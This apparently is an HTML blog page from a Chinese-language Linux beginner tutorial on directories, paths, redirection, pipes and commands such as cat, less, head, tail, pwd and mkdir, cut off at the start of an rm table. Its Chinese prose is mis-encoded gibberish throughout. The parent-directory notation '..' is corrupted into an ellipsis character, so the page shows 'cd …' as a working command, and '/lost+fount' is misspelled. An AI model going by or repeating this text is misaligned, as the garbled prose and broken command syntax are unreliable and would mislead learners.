<p>/homeï¼šç³»ç»Ÿé»˜è®¤çš„ç”¨æˆ·å®¶ç›®å½•ï¼Œæ–°å¢ç”¨æˆ·è´¦å·æ—¶ï¼Œç”¨æˆ·çš„å®¶ç›®å½•éƒ½å­˜æ”¾åœ¨æ­¤ç›®å½•ä¸‹ï¼Œè¡¨ç¤ºå½“å‰ç”¨æˆ·çš„å®¶ç›®å½•ï¼Œedu è¡¨ç¤ºç”¨æˆ· edu çš„å®¶ç›®å½•ã€‚</p>
</li>
<li class="lvl-2">
<p>/lib: /usr/lib: /usr/local/libï¼šç³»ç»Ÿä½¿ç”¨çš„å‡½æ•°åº“çš„ç›®å½•ï¼Œç¨‹åºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œéœ€è¦è°ƒç”¨ä¸€äº›é¢å¤–çš„å‚æ•°æ—¶éœ€è¦å‡½æ•°åº“çš„ååŠ©ã€‚</p>
</li>
<li class="lvl-2">
<p>/lost+fountï¼šç³»ç»Ÿå¼‚å¸¸äº§ç”Ÿé”™è¯¯æ—¶ï¼Œä¼šå°†ä¸€äº›é—å¤±çš„ç‰‡æ®µæ”¾ç½®äºæ­¤ç›®å½•ä¸‹ã€‚</p>
</li>
<li class="lvl-2">
<p>/mnt: /mediaï¼šå…‰ç›˜é»˜è®¤æŒ‚è½½ç‚¹ï¼Œé€šå¸¸å…‰ç›˜æŒ‚è½½äº /mnt/cdrom ä¸‹ï¼Œä¹Ÿä¸ä¸€å®šï¼Œå¯ä»¥é€‰æ‹©ä»»æ„ä½ç½®è¿›è¡ŒæŒ‚è½½ã€‚</p>
</li>
<li class="lvl-2">
<p>/optï¼šç»™ä¸»æœºé¢å¤–å®‰è£…è½¯ä»¶æ‰€æ‘†æ”¾çš„ç›®å½•ã€‚</p>
</li>
<li class="lvl-2">
<p>/procï¼šæ­¤ç›®å½•çš„æ•°æ®éƒ½åœ¨å†…å­˜ä¸­ï¼Œå¦‚ç³»ç»Ÿæ ¸å¿ƒï¼Œå¤–éƒ¨è®¾å¤‡ï¼Œç½‘ç»œçŠ¶æ€ï¼Œç”±äºæ•°æ®éƒ½å­˜æ”¾äºå†…å­˜ä¸­ï¼Œæ‰€ä»¥ä¸å ç”¨ç£ç›˜ç©ºé—´ï¼Œæ¯”è¾ƒé‡è¦çš„ç›®å½•æœ‰ /proc/cpuinfoã€/proc/interruptsã€/proc/dmaã€/proc/ioportsã€/proc/net/* ç­‰ã€‚</p>
</li>
<li class="lvl-2">
<p>/rootï¼šç³»ç»Ÿç®¡ç†å‘˜rootçš„å®¶ç›®å½•ã€‚</p>
</li>
<li class="lvl-2">
<p>/sbin: /usr/sbin: /usr/local/sbinï¼šæ”¾ç½®ç³»ç»Ÿç®¡ç†å‘˜ä½¿ç”¨çš„å¯æ‰§è¡Œå‘½ä»¤ï¼Œå¦‚fdiskã€shutdownã€mount ç­‰ã€‚ä¸ /bin ä¸åŒçš„æ˜¯ï¼Œè¿™å‡ ä¸ªç›®å½•æ˜¯ç»™ç³»ç»Ÿç®¡ç†å‘˜ rootä½¿ç”¨çš„å‘½ä»¤ï¼Œä¸€èˆ¬ç”¨æˆ·åªèƒ½&quot;æŸ¥çœ‹&quot;è€Œä¸èƒ½è®¾ç½®å’Œä½¿ç”¨ã€‚</p>
</li>
<li class="lvl-2">
<p>/tmpï¼šä¸€èˆ¬ç”¨æˆ·æˆ–æ­£åœ¨æ‰§è¡Œçš„ç¨‹åºä¸´æ—¶å­˜æ”¾æ–‡ä»¶çš„ç›®å½•ï¼Œä»»ä½•äººéƒ½å¯ä»¥è®¿é—®ï¼Œé‡è¦æ•°æ®ä¸å¯æ”¾ç½®åœ¨æ­¤ç›®å½•ä¸‹ã€‚</p>
</li>
<li class="lvl-2">
<p>/srvï¼šæœåŠ¡å¯åŠ¨ä¹‹åéœ€è¦è®¿é—®çš„æ•°æ®ç›®å½•ï¼Œå¦‚ www æœåŠ¡éœ€è¦è®¿é—®çš„ç½‘é¡µæ•°æ®å­˜æ”¾åœ¨ /srv/www å†…ã€‚</p>
</li>
<li class="lvl-2">
<p>/usrï¼šåº”ç”¨ç¨‹åºå­˜æ”¾ç›®å½•ï¼Œ/usr/bin å­˜æ”¾åº”ç”¨ç¨‹åºï¼Œ/usr/share å­˜æ”¾å…±äº«æ•°æ®ï¼Œ/usr/lib  å­˜æ”¾ä¸èƒ½ç›´æ¥è¿è¡Œçš„ï¼Œå´æ˜¯è®¸å¤šç¨‹åºè¿è¡Œæ‰€å¿…éœ€çš„ä¸€äº›å‡½æ•°åº“æ–‡ä»¶ã€‚/usr/local: å­˜æ”¾è½¯ä»¶å‡çº§åŒ…ã€‚/usr/share/doc:  ç³»ç»Ÿè¯´æ˜æ–‡ä»¶å­˜æ”¾ç›®å½•ã€‚/usr/share/man: ç¨‹åºè¯´æ˜æ–‡ä»¶å­˜æ”¾ç›®å½•ã€‚</p>
</li>
<li class="lvl-2">
<p>/varï¼šæ”¾ç½®ç³»ç»Ÿæ‰§è¡Œè¿‡ç¨‹ä¸­ç»å¸¸å˜åŒ–çš„æ–‡ä»¶ï¼Œå¦‚éšæ—¶æ›´æ”¹çš„æ—¥å¿—æ–‡ä»¶ /var/logï¼Œ/var/log/messageï¼šæ‰€æœ‰çš„ç™»å½•æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼Œ/var/spool/mailï¼šé‚®ä»¶å­˜æ”¾çš„ç›®å½•ï¼Œ/var/run:ç¨‹åºæˆ–æœåŠ¡å¯åŠ¨åï¼Œå…¶PIDå­˜æ”¾åœ¨è¯¥ç›®å½•ä¸‹ã€‚</p>
</li>
</ul>
<span id="more"></span>
<p>ä½äº/home/userï¼Œç§°ä¹‹ä¸ºç”¨æˆ·å·¥ä½œç›®å½•æˆ–å®¶ç›®å½•,è¡¨ç¤ºæ–¹å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/home/user</span><br><span class="line">~</span><br></pre></td></tr></table></figure>
<p>ä»/ç›®å½•å¼€å§‹æè¿°çš„è·¯å¾„ä¸º<strong>ç»å¯¹è·¯å¾„</strong>ï¼Œå¦‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">ls</span> /usr</span><br></pre></td></tr></table></figure>
<p>ä»å½“å‰ä½ç½®å¼€å§‹æè¿°çš„è·¯å¾„ä¸º<strong>ç›¸å¯¹è·¯å¾„</strong>ï¼Œå¦‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ../../</span><br><span class="line"><span class="built_in">ls</span> abc/def</span><br></pre></td></tr></table></figure>
<p>æ¯ä¸ªç›®å½•ä¸‹éƒ½æœ‰**.å’Œâ€¦**</p>
<p>. è¡¨ç¤ºå½“å‰ç›®å½•</p>
<p>â€¦ è¡¨ç¤ºä¸Šä¸€çº§ç›®å½•ï¼Œå³çˆ¶ç›®å½•</p>
<p>æ ¹ç›®å½•ä¸‹çš„.å’Œâ€¦éƒ½è¡¨ç¤ºå½“å‰ç›®å½•</p>
<h2 id="åŸºç¡€æ“ä½œ">åŸºç¡€æ“ä½œ</h2>
<h4 id="è¾“å‡ºé‡å®šå‘ï¼š">è¾“å‡ºé‡å®šå‘ï¼š&gt;</h4>
<p>å¯å°†æœ¬åº”æ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸Šçš„å†…å®¹ä¿å­˜åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ã€‚</p>
<p>å¦‚ï¼šls &gt; test.txt ( test.txt å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºï¼Œå­˜åœ¨åˆ™è¦†ç›–å…¶å†…å®¹ )</p>
<p>æ³¨æ„ï¼š <code>&gt;è¾“å‡ºé‡å®šå‘ä¼šè¦†ç›–åŸæ¥çš„å†…å®¹ï¼Œ&gt;&gt;è¾“å‡ºé‡å®šå‘åˆ™ä¼šè¿½åŠ åˆ°æ–‡ä»¶çš„å°¾éƒ¨ã€‚</code></p>
<h4 id="ç®¡é“ï¼š">ç®¡é“ï¼š|</h4>
<p>ç®¡é“ï¼šä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºå¯ä»¥é€šè¿‡ç®¡é“åšä¸ºå¦ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ã€‚</p>
<p>â€œ | â€çš„å·¦å³åˆ†ä¸ºä¸¤ç«¯ï¼Œä»å·¦ç«¯å†™å…¥åˆ°å³ç«¯ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:/bin$ ll -h |more   </span><br><span class="line">æ€»ç”¨é‡ 13M</span><br><span class="line">drwxr-xr-x  2 root root  4.0K 8æœˆ   4  2016 ./</span><br><span class="line">drwxr-xr-x 26 root root  4.0K 7æœˆ  30  2016 ../</span><br><span class="line">-rwxr-xr-x  1 root root 1014K 6æœˆ  24  2016 bash*</span><br><span class="line">-rwxr-xr-x  1 root root   31K 5æœˆ  20  2015 bunzip2*</span><br><span class="line">-rwxr-xr-x  1 root root  1.9M 8æœˆ  19  2015 busybox*</span><br><span class="line">-rwxr-xr-x  1 root root   31K 5æœˆ  20  2015 bzcat*</span><br><span class="line">lrwxrwxrwx  1 root root     6 5æœˆ  16  2016 bzcmp -&gt; bzdiff*</span><br><span class="line">-rwxr-xr-x  1 root root  2.1K 5æœˆ  20  2015 bzdiff*</span><br><span class="line">lrwxrwxrwx  1 root root     6 5æœˆ  16  2016 bzegrep -&gt; bzgrep*</span><br><span class="line">--æ›´å¤š--</span><br></pre></td></tr></table></figure>
<h4 id="æ¸…å±ï¼šclear">æ¸…å±ï¼šclear</h4>
<p>clearä½œç”¨ä¸ºæ¸…é™¤ç»ˆç«¯ä¸Šçš„æ˜¾ç¤º(ç±»ä¼¼äºDOSçš„clsæ¸…å±åŠŸèƒ½)ï¼Œå¿«æ·é”®ï¼šCtrl + l ( â€œlâ€ ä¸ºå­—æ¯ )ã€‚</p>
<h4 id="åˆ‡æ¢å·¥ä½œç›®å½•ï¼š-cd">åˆ‡æ¢å·¥ä½œç›®å½•ï¼š cd</h4>
<p>Linuxæ‰€æœ‰çš„ç›®å½•å’Œæ–‡ä»¶åå¤§å°å†™æ•æ„Ÿ</p>
<p>cdåé¢å¯è·Ÿç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥è·Ÿç›¸å¯¹è·¯å¾„ã€‚å¦‚æœçœç•¥ç›®å½•ï¼Œåˆ™é»˜è®¤åˆ‡æ¢åˆ°å½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•ã€‚</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>cd</td>
<td>ç›¸å½“äºcd ~</td>
</tr>
<tr>
<td>cd ~</td>
<td>åˆ‡æ¢åˆ°å½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•(/home/ç”¨æˆ·ç›®å½•)</td>
</tr>
<tr>
<td>cd .</td>
<td>åˆ‡æ¢åˆ°å½“å‰ç›®å½•</td>
</tr>
<tr>
<td>cd â€¦</td>
<td>åˆ‡æ¢åˆ°ä¸Šçº§ç›®å½•</td>
</tr>
<tr>
<td>cd -</td>
<td>è¿›å…¥ä¸Šæ¬¡æ‰€åœ¨çš„ç›®å½•</td>
</tr>
</tbody>
</table>
<h4 id="æŸ¥çœ‹å‘½ä»¤ä½ç½®ï¼šwhich">æŸ¥çœ‹å‘½ä»¤ä½ç½®ï¼šwhich</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~$ <span class="built_in">which</span> <span class="built_in">ls</span></span><br><span class="line">/bin/ls</span><br><span class="line">python@ubuntu:~$ <span class="built_in">which</span> <span class="built_in">sudo</span></span><br><span class="line">/usr/bin/sudo</span><br></pre></td></tr></table></figure>
<h2 id="æŸ¥çœ‹æ–‡ä»¶å†…å®¹">æŸ¥çœ‹æ–‡ä»¶å†…å®¹</h2>
<p>Linuxç³»ç»Ÿä¸­ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>cat ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</p>
</li>
<li class="lvl-2">
<p>tac ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤º</p>
</li>
<li class="lvl-2">
<p>nl æ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºé“è¾“å‡ºè¡Œå·</p>
</li>
<li class="lvl-2">
<p>more ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</p>
</li>
<li class="lvl-2">
<p>lessä¸more ç±»ä¼¼ï¼Œä½†å¯ä»¥å¾€å‰ç¿»é¡µ</p>
</li>
<li class="lvl-2">
<p>head åªçœ‹å¤´å‡ è¡Œ</p>
</li>
<li class="lvl-2">
<p>tail åªçœ‹å°¾å·´å‡ è¡Œ</p>
</li>
</ul>
<h4 id="åŸºæœ¬æ˜¾ç¤ºï¼šcatã€tac">åŸºæœ¬æ˜¾ç¤ºï¼šcatã€tac</h4>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> [-AbEnTv]</span><br></pre></td></tr></table></figure>
<p>é€‰é¡¹ä¸å‚æ•°ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-A ï¼šç›¸å½“äº -vET çš„æ•´åˆé€‰é¡¹ï¼Œå¯åˆ—å‡ºä¸€äº›ç‰¹æ®Šå­—ç¬¦è€Œä¸æ˜¯ç©ºç™½è€Œå·²ï¼›</p>
</li>
<li class="lvl-2">
<p>-v ï¼šåˆ—å‡ºä¸€äº›çœ‹ä¸å‡ºæ¥çš„ç‰¹æ®Šå­—ç¬¦</p>
</li>
<li class="lvl-2">
<p>-E ï¼šå°†ç»“å°¾çš„æ–­è¡Œå­—èŠ‚ $ æ˜¾ç¤ºå‡ºæ¥ï¼›</p>
</li>
<li class="lvl-2">
<p>-T ï¼šå°† [tab] æŒ‰é”®ä»¥ ^I æ˜¾ç¤ºå‡ºæ¥ï¼›</p>
</li>
<li class="lvl-2">
<p>-b ï¼šåˆ—å‡ºè¡Œå·ï¼Œç©ºç™½è¡Œä¸æ ‡è¡Œå·</p>
</li>
<li class="lvl-2">
<p>-n ï¼šåˆ—å‡ºè¡Œå·ï¼Œè¿åŒç©ºç™½è¡Œä¹Ÿä¼šæœ‰è¡Œå·</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:/]# <span class="built_in">cat</span> -b /etc/issue</span><br><span class="line">     1	\S</span><br><span class="line">     2	Kernel \r on an \m</span><br><span class="line"></span><br><span class="line">[root@rocky8:/]# <span class="built_in">cat</span> -n /etc/issue</span><br><span class="line">     1	\S</span><br><span class="line">     2	Kernel \r on an \m</span><br><span class="line">     3</span><br></pre></td></tr></table></figure>
<p>tacä¸catå‘½ä»¤åˆšå¥½ç›¸åï¼Œæ–‡ä»¶å†…å®¹ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„å€’ç€å†™ï¼å¦‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:/]# <span class="built_in">tac</span> /etc/issue</span><br><span class="line"></span><br><span class="line">Kernel \r on an \m</span><br><span class="line">\S</span><br></pre></td></tr></table></figure>
<h4 id="æ˜¾ç¤ºè¡Œå·ï¼šnl">æ˜¾ç¤ºè¡Œå·ï¼šnl</h4>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nl</span> [-bnw] æ–‡ä»¶</span><br></pre></td></tr></table></figure>
<p>é€‰é¡¹ä¸å‚æ•°ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-b ï¼šæŒ‡å®šè¡Œå·æŒ‡å®šçš„æ–¹å¼ï¼Œä¸»è¦æœ‰ä¸¤ç§ï¼š<br>
-b a ï¼šè¡¨ç¤ºä¸è®ºæ˜¯å¦ä¸ºç©ºè¡Œï¼Œä¹ŸåŒæ ·åˆ—å‡ºè¡Œå·(ç±»ä¼¼ cat -n)ï¼›<br>
-b t ï¼šå¦‚æœæœ‰ç©ºè¡Œï¼Œç©ºçš„é‚£ä¸€è¡Œä¸è¦åˆ—å‡ºè¡Œå·(é»˜è®¤å€¼)ï¼›</p>
</li>
<li class="lvl-2">
<p>-n ï¼šåˆ—å‡ºè¡Œå·è¡¨ç¤ºçš„æ–¹æ³•ï¼Œä¸»è¦æœ‰ä¸‰ç§ï¼š<br>
-n ln ï¼šè¡Œå·åœ¨è§å¹•çš„æœ€å·¦æ–¹æ˜¾ç¤ºï¼›<br>
-n rn ï¼šè¡Œå·åœ¨è‡ªå·±æ ä½çš„æœ€å³æ–¹æ˜¾ç¤ºï¼Œä¸”ä¸åŠ  0 ï¼›<br>
-n rz ï¼šè¡Œå·åœ¨è‡ªå·±æ ä½çš„æœ€å³æ–¹æ˜¾ç¤ºï¼Œä¸”åŠ  0 ï¼›</p>
</li>
<li class="lvl-2">
<p>-w ï¼šè¡Œå·æ ä½çš„å ç”¨çš„ä½æ•°ã€‚</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:/]# <span class="built_in">nl</span> /etc/issue</span><br><span class="line">     1	\S</span><br><span class="line">     2	Kernel \r on an \m</span><br><span class="line">       </span><br></pre></td></tr></table></figure>
<h4 id="åˆ†å±æ˜¾ç¤ºï¼šmoreã€less">åˆ†å±æ˜¾ç¤ºï¼šmoreã€less</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:/]# more /etc/man_db.config </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Generated automatically from man.conf.in by the</span></span><br><span class="line"><span class="comment"># configure script.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># man.conf from man-1.6d</span></span><br><span class="line">....(ä¸­é—´çœç•¥)....</span><br><span class="line">--More--(28%)  &lt;== å…‰æ ‡åœ¨è¿™é‡Œç­‰å¾…å‘½ä»¤</span><br></pre></td></tr></table></figure>
<p>moreè¿è¡Œæ—¶å¯ä»¥è¾“å…¥çš„å‘½ä»¤æœ‰ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ç©ºç™½é”® (space)ï¼šä»£è¡¨å‘ä¸‹ç¿»ä¸€é¡µï¼›</p>
</li>
<li class="lvl-2">
<p>Enter ï¼šä»£è¡¨å‘ä¸‹ç¿»ã€ä¸€è¡Œã€ï¼›</p>
</li>
<li class="lvl-2">
<p>/å­—ä¸² ï¼šä»£è¡¨åœ¨è¿™ä¸ªæ˜¾ç¤ºçš„å†…å®¹å½“ä¸­ï¼Œå‘ä¸‹æœå¯»ã€å­—ä¸²ã€è¿™ä¸ªå…³é”®å­—ï¼›</p>
</li>
<li class="lvl-2">
<p>:f ï¼šç«‹åˆ»æ˜¾ç¤ºå‡ºæ¡£åä»¥åŠç›®å‰æ˜¾ç¤ºçš„è¡Œæ•°ï¼›</p>
</li>
<li class="lvl-2">
<p>q ï¼šä»£è¡¨ç«‹åˆ»ç¦»å¼€ more ï¼Œä¸å†æ˜¾ç¤ºè¯¥æ–‡ä»¶å†…å®¹ã€‚</p>
</li>
<li class="lvl-2">
<p>b æˆ– [ctrl]-b ï¼šä»£è¡¨å¾€å›ç¿»é¡µï¼Œä¸è¿‡è¿™åŠ¨ä½œåªå¯¹æ–‡ä»¶æœ‰ç”¨ï¼Œå¯¹ç®¡çº¿æ— ç”¨ã€‚</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:/]# less /etc/man.config</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Generated automatically from man.conf.in by the</span></span><br><span class="line"><span class="comment"># configure script.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># man.conf from man-1.6d</span></span><br><span class="line">....(ä¸­é—´çœç•¥)....</span><br><span class="line">:   &lt;== è¿™é‡Œå¯ä»¥ç­‰å¾…ä½ è¾“å…¥å‘½ä»¤ï¼</span><br></pre></td></tr></table></figure>
<p>lessè¿è¡Œæ—¶å¯ä»¥è¾“å…¥çš„å‘½ä»¤æœ‰ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ç©ºç™½é”® ï¼šå‘ä¸‹ç¿»åŠ¨ä¸€é¡µï¼›</p>
</li>
<li class="lvl-2">
<p>[pagedown]ï¼šå‘ä¸‹ç¿»åŠ¨ä¸€é¡µï¼›</p>
</li>
<li class="lvl-2">
<p>[pageup] ï¼šå‘ä¸Šç¿»åŠ¨ä¸€é¡µï¼›</p>
</li>
<li class="lvl-2">
<p>/å­—ä¸² ï¼šå‘ä¸‹æœå¯»ã€å­—ä¸²ã€çš„åŠŸèƒ½ï¼›</p>
</li>
<li class="lvl-2">
<p>?å­—ä¸² ï¼šå‘ä¸Šæœå¯»ã€å­—ä¸²ã€çš„åŠŸèƒ½ï¼›</p>
</li>
<li class="lvl-2">
<p>n ï¼šé‡å¤å‰ä¸€ä¸ªæœå¯» (ä¸ / æˆ– ? æœ‰å…³ï¼)</p>
</li>
<li class="lvl-2">
<p>N ï¼šåå‘çš„é‡å¤å‰ä¸€ä¸ªæœå¯» (ä¸ / æˆ– ? æœ‰å…³ï¼)</p>
</li>
<li class="lvl-2">
<p>q ï¼šç¦»å¼€ less è¿™ä¸ªç¨‹åºï¼›</p>
</li>
</ul>
<h4 id="å–é¦–å°¾nè¡Œï¼šheadã€tail">å–é¦–å°¾nè¡Œï¼šheadã€tail</h4>
<p>headå–å‡ºæ–‡ä»¶å‰é¢å‡ è¡Œ</p>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">head</span> [-n number] æ–‡ä»¶ </span><br></pre></td></tr></table></figure>
<p>é€‰é¡¹ä¸å‚æ•°ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-n ï¼šåé¢æ¥æ•°å­—ï¼Œä»£è¡¨æ˜¾ç¤ºå‡ è¡Œçš„æ„æ€</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">head</span> /etc/man.config</span><br></pre></td></tr></table></figure>
<p>é»˜è®¤çš„æƒ…å†µä¸­ï¼Œæ˜¾ç¤ºå‰é¢ 10 è¡Œï¼è‹¥è¦æ˜¾ç¤ºå‰ 20 è¡Œï¼Œå°±å¾—è¦è¿™æ ·ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">head</span> -n 20 /etc/man.config</span><br></pre></td></tr></table></figure>
<p>tailå–å‡ºæ–‡ä»¶åé¢å‡ è¡Œ</p>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> [-n number] æ–‡ä»¶ </span><br></pre></td></tr></table></figure>
<p>é€‰é¡¹ä¸å‚æ•°ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-n ï¼šåé¢æ¥æ•°å­—ï¼Œä»£è¡¨æ˜¾ç¤ºå‡ è¡Œçš„æ„æ€</p>
</li>
<li class="lvl-2">
<p>-f ï¼šè¡¨ç¤ºæŒç»­ä¾¦æµ‹åé¢æ‰€æ¥çš„æ¡£åï¼Œè¦ç­‰åˆ°æŒ‰ä¸‹[ctrl]-cæ‰ä¼šç»“æŸtailçš„ä¾¦æµ‹</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">tail</span> /etc/man.config</span><br><span class="line"><span class="comment"># é»˜è®¤çš„æƒ…å†µä¸­ï¼Œæ˜¾ç¤ºæœ€åçš„åè¡Œï¼è‹¥è¦æ˜¾ç¤ºæœ€åçš„ 20 è¡Œï¼Œå°±å¾—è¦è¿™æ ·ï¼š</span></span><br><span class="line">[root@rocky8:~]# <span class="built_in">tail</span> -n 20 /etc/man.config</span><br></pre></td></tr></table></figure>
<h4 id="æ˜¾ç¤ºå½“å‰è·¯å¾„ï¼špwd">æ˜¾ç¤ºå½“å‰è·¯å¾„ï¼špwd</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">pwd</span></span><br><span class="line">/root</span><br></pre></td></tr></table></figure>
<p>é€‰é¡¹ä¸å‚æ•°ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>-P</strong> ï¼šæ˜¾ç¤ºå‡ºç¡®å®çš„è·¯å¾„ï¼Œè€Œéä½¿ç”¨è¿ç»“ (link) è·¯å¾„ã€‚</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cd</span> /var/mail</span><br><span class="line">[root@rocky8:mail]# <span class="built_in">pwd</span></span><br><span class="line">/var/mail</span><br><span class="line">[root@rocky8:mail]# <span class="built_in">pwd</span> -P</span><br><span class="line">/var/spool/mail</span><br></pre></td></tr></table></figure>
<h2 id="æ–‡ä»¶æ“ä½œ">æ–‡ä»¶æ“ä½œ</h2>
<h4 id="åˆ›å»ºç›®å½•ï¼šmkdir">åˆ›å»ºç›®å½•ï¼šmkdir</h4>
<p>mkdirå¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ç›®å½•ã€‚</p>
<p>æ³¨æ„ï¼šæ–°å»ºç›®å½•çš„åç§°ä¸èƒ½ä¸å½“å‰ç›®å½•ä¸­å·²æœ‰çš„ç›®å½•æˆ–æ–‡ä»¶åŒåï¼Œå¹¶ä¸”ç›®å½•åˆ›å»ºè€…å¿…é¡»å¯¹å½“å‰ç›®å½•å…·æœ‰å†™æƒé™ã€‚</p>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> [-mp] ç›®å½•åç§°</span><br></pre></td></tr></table></figure>
<p>é€‰é¡¹ä¸å‚æ•°ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-m ï¼šæŒ‡å®šè¢«åˆ›å»ºç›®å½•çš„æƒé™ï¼Œè€Œä¸æ˜¯æ ¹æ®é»˜è®¤æƒé™ (umask) è®¾å®š</p>
</li>
<li class="lvl-2">
<p>-p ï¼šé€’å½’åˆ›å»ºæ‰€éœ€è¦çš„ç›®å½•</p>
</li>
</ul>
<p>å®ä¾‹ï¼š-pé€’å½’åˆ›å»ºç›®å½•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cd</span> /tmp</span><br><span class="line">[root@rocky8:tmp]# <span class="built_in">mkdir</span> <span class="built_in">test</span>	&lt;==åˆ›å»ºä¸€åä¸º <span class="built_in">test</span> çš„æ–°ç›®å½•</span><br><span class="line">[root@rocky8:tmp]# <span class="built_in">mkdir</span> test1/test2/test3/test4</span><br><span class="line"><span class="built_in">mkdir</span>: cannot create directory â€˜test1/test2/test3/test4â€™: No such file or directory		&lt;== æ²¡åŠæ³•ç›´æ¥åˆ›å»ºæ­¤ç›®å½•å•Šï¼</span><br><span class="line">[root@rocky8:tmp]# <span class="built_in">mkdir</span> -p test1/test2/test3/test4</span><br></pre></td></tr></table></figure>
<p>mkdiråˆ›å»ºçš„ç›®å½•æƒé™é»˜è®¤æ ¹æ®umaskå¾—åˆ°ï¼Œè€Œ-må‚æ•°å¯ä»¥æŒ‡å®šè¢«åˆ›å»ºç›®å½•çš„æƒé™ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">mkdir</span> t1</span><br><span class="line">[root@rocky8:~]# ll</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x. 2 root root 6 Feb 20 15:06 t1</span><br><span class="line">[root@rocky8:~]# <span class="built_in">mkdir</span> t2 -m 711</span><br><span class="line">[root@rocky8:~]# ll</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x. 2 root root 6 Feb 20 15:06 t1</span><br><span class="line">drwx--x--x. 2 root root 6 Feb 20 15:06 t2</span><br></pre></td></tr></table></figure>
<h4 id="åˆ é™¤æ–‡ä»¶ï¼šrm">åˆ é™¤æ–‡ä»¶ï¼šrm</h4>
<p>å¯é€šè¿‡rmåˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ã€‚ä½¿ç”¨rmå‘½ä»¤è¦å°å¿ƒï¼Œå› ä¸ºæ–‡ä»¶åˆ é™¤åä¸èƒ½æ¢å¤ã€‚ä¸ºäº†é˜²æ­¢æ–‡ä»¶è¯¯åˆ ï¼Œå¯ä»¥åœ¨rmåä½¿ç”¨-iå‚æ•°ä»¥é€ä¸ªç¡®è®¤è¦åˆ é™¤çš„æ–‡ä»¶ã€‚</p>
<p>å¸¸ç”¨å‚æ•°åŠå«ä¹‰å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>-i</td>
<td>ä»¥è¿›è¡Œäº¤äº’å¼æ–¹å¼æ‰§è¡Œ</td>
</tr>
<tr>
<td>-f</td>
